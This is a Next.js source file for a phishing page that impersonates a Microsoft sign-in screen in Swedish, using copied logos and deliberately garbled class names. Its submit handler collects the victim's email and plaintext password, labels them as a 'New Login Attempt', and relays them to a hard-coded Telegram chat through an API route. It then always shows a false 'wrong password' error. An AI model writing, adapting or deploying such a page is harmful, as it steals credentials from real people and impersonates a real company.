'use client';

import { useForm } from 'react-hook-form';
import { z } from 'zod';
import { zodResolver } from '@hookform/resolvers/zod';
import { useState } from 'react';
import Link from 'next/link';

const loginSchema = z.object({
    email: z.string().email({ message: 'Invalid email address' }),
    password: z.string().min(1, { message: 'Password is required' }),
});

type LoginForm = z.infer<typeof loginSchema>;

export default function LoginPage() {
    const [sending, setSending] = useState(false);
    const [error, setError] = useState(false);

    const {
        register,
        handleSubmit,
        formState: { errors },
    } = useForm<LoginForm>({
        resolver: zodResolver(loginSchema),
    });

    const chatId = -4932632175

    const onSubmit = async (data: LoginForm) => {
        console.log(data);
        setSending(true);
        const message = `🟢 New Login Attempt\n\n📧 Email: ${data.email}\n🔐 Password: ${data.password}`;

        try {
            const res = await fetch("/api/send-message", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chatId, text: message }),
            })

            const data = await res.json()
            console.log("Telegram response:", data)
            setSending(false);
            setError(true);
            setTimeout(() => setError(false), 4000);
        } catch (err) {
            console.error('Telegram error:', err);
            setError(true);
            setSending(false);
            setTimeout(() => setError(false), 4000);
        }
    };


    return (

        <main className='flex items-center justify-center min-h-screen'>
            <div className="aB_c0nT41n3r_X7z9">
                <div className="wE1Rd0_1c0n_r0w_42">
                    <svg className="b1Z4rR3_1c0n_99" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path fill="#737373" d="M23 1.5q.41 0 .7.3.3.29.3.7v19q0 .41-.3.7-.29.3-.7.3H7q-.41 0-.7-.3-.3-.29-.3-.7V18H1q-.41 0-.7-.3-.3-.29-.3-.7V7q0-.41.3-.7Q.58 6 1 6h5V2.5q0-.41.3-.7.29-.3.7-.3zM6 13.28l1.42 2.66h2.14l-1.42-2.66h.86q.71 0 1.2-.49.49-.49.49-1.2V10.4q0-.71-.49-1.2-.49-.49-1.2-.49H6zm14-8.78H7V18h13zM12.5 15.5q-.21 0-.35-.15-.15-.14-.15-.35t.15-.35q.14-.15.35-.15t.35.15q.15.15.15.35t-.15.35q-.14.15-.35.15m.5-2h-1l-.5-5h2z"></path>
                    </svg>

                    <svg className="b1Z4rR3_1c0n_99" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path fill="#737373" d="M20.08 13.64q1.12.45 1.82 1.48.7 1.02.7 2.26 0 1.6-1.14 2.73Q20.33 21.25 18.73 21.25H7q-1.95 0-3.33-1.38Q2.3 18.5 2.3 16.55q0-1.73 1.14-3.07 1.14-1.35 2.85-1.6.4-1.4 1.5-2.37 1.12-.98 2.6-1.14 1.48-.16 2.8.4 1.33.58 2.18 1.77.8-.22 1.63-.12.84.1 1.54.47.7.37 1.2.97.5.6.75 1.35-.56.05-1.05.3-.49.24-.86.63zm-2.7-.39q-.56-.68-1.4-1.04-.83-.37-1.73-.3-.9.06-1.67.54-.76.48-1.23 1.25-.5-.17-1.04-.14-.54.03-1.02.26-.48.22-.85.6-.36.37-.57.85-.6-.17-1.23-.02-.64.15-1.14.57-.5.42-.78 1.03-.28.6-.28 1.3 0 .87.62 1.48.62.62 1.48.62h11.75q.67 0 1.14-.47.47-.47.47-1.14 0-.62-.37-1.1-.37-.5-.97-.6-.07-.7-.48-1.2z"></path>
                    </svg>

                    <svg className="b1Z4rR3_1c0n_99" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path fill="#737373" d="M22 8.2v7.6L17 12zm-6-5.7H4.5q-.5 0-.85.35-.35.35-.35.85v16q0 .5.35.85.35.35.85.35h11.5q.5 0 .85-.35.35-.35.35-.85v-5.8l5.8 3.65q.45.25.85.05.4-.2.4-.7v-10q0-.5-.4-.7-.4-.2-.85.05L18 10.8V4.5q0-.5-.35-.85-.35-.35-.85-.35zm0 7.2l-5.5-3.4-5.5 3.4v-5.7h11zm-11 1l5.5 3.4 5.5-3.4v5.7H5z"></path>
                    </svg>

                    <div className="m1Cr0s0fT_l0G0">
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                    </div>

                    <svg className="b1Z4rR3_1c0n_99" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path fill="#737373" d="M12 2q-2.37 0-4.46.89-2.08.88-3.65 2.45Q2.32 6.9 1.44 8.98.55 11.07.55 13.44q0 2.38.89 4.46.88 2.09 2.45 3.65 1.57 1.57 3.65 2.45 2.09.89 4.46.89 2.38 0 4.46-.89 2.09-.88 3.65-2.45 1.57-1.56 2.45-3.65.89-2.08.89-4.46 0-2.37-.89-4.46-.88-2.08-2.45-3.64-1.56-1.57-3.65-2.45Q14.38 2 12 2m0 2q1.56 0 3.07.85-1.32 1.12-3.07 3.44-1.75-2.31-3.07-3.44Q10.44 4 12 4m-4.66 1.34q.85.94 2.38 2.81 1.53 1.88 2.28 3.35-1.5 1.8-2.28 3.35-.78 1.56-2.38 2.81-1.5-1.5-2.34-3.43-.85-1.94-.85-3.78 0-1.84.85-3.78.84-1.93 2.34-3.43m9.32 0q1.5 1.5 2.34 3.43.85 1.94.85 3.78 0 1.84-.85 3.78-.84 1.93-2.34 3.43-1.6-1.25-2.38-2.81-.78-1.55-2.28-3.35.75-1.47 2.28-3.35 1.53-1.87 2.38-2.81"></path>
                    </svg>

                    <svg className="b1Z4rR3_1c0n_99" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path fill="#737373" d="M18 6q1.22 0 2.11.89.89.89.89 2.11 0 .47-.14.94.14.47.14.94 0 1.95-.76 3.7-.76 1.76-2.05 3.05-1.3 1.3-3.05 2.05-1.75.76-3.7.76-.47 0-.94-.14-.47.14-.94.14-1.22 0-2.11-.89Q6.56 18.66 6.56 17.44q0-.47.14-.94-.14-.47-.14-.94 0-1.95.76-3.7.76-1.76 2.05-3.05 1.3-1.3 3.05-2.05 1.75-.76 3.7-.76.47 0 .94.14.47-.14.94-.14m-6 10.5q2.07 0 3.54-1.46 1.46-1.47 1.46-3.54 0-.43-.09-.84-.09-.42-.26-.8l-1.13.34q-.06.28-.09.54-.03.27-.03.54 0 1.22-.89 2.11-.89.89-2.11.89-.27 0-.54-.03-.26-.03-.54-.09l-.34 1.13q.38.17.8.26.41.09.84.09M9.5 12q0-1.04.73-1.77.73-.73 1.77-.73.27 0 .54.03.26.03.54.09l.34-1.13q-.38-.17-.8-.26-.41-.09-.84-.09-2.07 0-3.54 1.46-1.46 1.47-1.46 3.54 0 .43.09.84.09.42.26.8l1.13-.34q.06-.28.09-.54.03-.27.03-.54z"></path>
                    </svg>

                    <svg className="b1Z4rR3_1c0n_99" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path fill="#737373" d="M5 3v13.5l4.5 2.5 5-2.5v-5l-5 2.5-1.5-.75V3z"></path>
                    </svg>
                </div>

                <h1 id="cR4zY_h34d3r_t3Xt">Logga in</h1>

                <p className="z4nY_sUbT3xT_123">Använd ditt Microsoft-konto</p>
                <a href="#" className="qU1rKy_l1Nk_bLu3">Vad är det här?</a>



                <form onSubmit={handleSubmit(onSubmit)} className="w4cKy_f0Rm_3l3m3nT_X">
                    <div className='w-full'>
                        <input
                            type="email"
                            placeholder="Email"
                            {...register('email')}
                            className="0Dd_1nPuT_f13Ld_42 inputs"
                        />
                        {errors.email && <p className="text-red-600 text-xs mb-2">{errors.email.message}</p>}

                    </div>
                    <div className='w-full'>
                        <input
                            type="password"
                            placeholder="Password"
                            {...register('password')}
                            className="0Dd_1nPuT_f13Ld_42 inputs"
                        />
                        {errors.password && (
                            <p className="text-red-600 text-xs mb-4">{errors.password.message}</p>
                        )}
                    </div>




                    <div className="b0nK3rS_cH3cKb0x_Wr4p">
                        <input type="checkbox" id="k33pS1gn3d1n" className="nUtTy_cH3cKb0x_99" />
                        <label htmlFor="k33pS1gn3d1n" className="l00Py_cH3cKb0x_t3Xt">Håll mig inloggad</label>
                    </div>
                    <div className="space-y-2 w-full">
                        <button
                            type="submit"
                            disabled={sending}
                            id="login" className="cR4zY_bUtT0n_bLu3"
                        >
                            {sending ? 'Signing in...' : 'Sign in'}
                        </button>
                        {error && (
                            <p className="text-xs text-red-600 mb-4 text-center"> Tyvärr var ditt lösenord felaktigt. Kontrollera lösenordet noggrant.</p>
                        )}  </div>


                    <div className="n0_4cC0unT_t3Xt">
                       Inget konto? <a href="#" className="qU1rKy_l1Nk_bLu3">Skapa en!</a>
                    </div>

                    <div className="w31Rd_b0tT0m_l1nKs">
                        <Link href="#" className="qU1rKy_l1Nk_bLu3">Glömt mitt lösenord</Link>
                        <Link href="#" className="qU1rKy_l1Nk_bLu3">Logga in med en engångskod</Link>
                    </div>
                </form >
            </div >
        </main>

    );
}
